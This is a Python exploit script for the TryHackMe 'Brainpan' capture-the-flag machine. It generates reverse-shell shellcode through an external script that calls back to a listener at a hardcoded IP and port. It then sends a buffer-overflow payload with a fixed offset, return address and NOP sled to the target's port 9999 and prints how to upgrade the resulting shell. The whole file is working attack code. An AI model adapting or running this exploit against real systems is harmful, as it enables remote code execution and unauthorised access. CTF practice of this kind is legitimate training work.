#!/usr/bin/python3

import argparse
import subprocess
import socket
import sys
import os


parser = argparse.ArgumentParser(description='Exploit for brainpan machine from THM.',
                                 usage='./brainpan.py LHOST LPORT RHOST'
                                 )

parser.add_argument('-a', '--LHOST', help='local ip address for the listener')
parser.add_argument('-p', '--LPORT', help='local port for the listener')
parser.add_argument('-t', '--RHOST', help='target machine ip')
args = parser.parse_args()

target = args.RHOST
ip = args.LHOST
port = args.LPORT

def generate_shellcode(ip, port):
    
    proc = subprocess.run(['sh', './venom.sh', ip, port], stdout=subprocess.PIPE) 
    
    with open('/tmp/raw') as file:
        for line in file:
            exec(line, globals())
    
    os.remove('/tmp/raw')
    return buf

print('\n[+] Genereting shellcode...\n')
venom = generate_shellcode('10.18.22.182', '9001')
padding = b'\x90' * 32
buffer = b'A' * 524
opcode = b'\xf3\x12\x17\x31'
shellcode = buffer + opcode + padding + venom


print('\n[+] connecting to target...')
try:
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect(('10.10.54.56', 9999))
    conn.sendall(shellcode)
    conn.close()

except Exception as e:
    print(f'\n{e}')
    sys.exit()

print('''\n[+] Success!, to get a full TTY shell run "python3 -c 'import pty; pty.spawn("/bin/bash")'"''')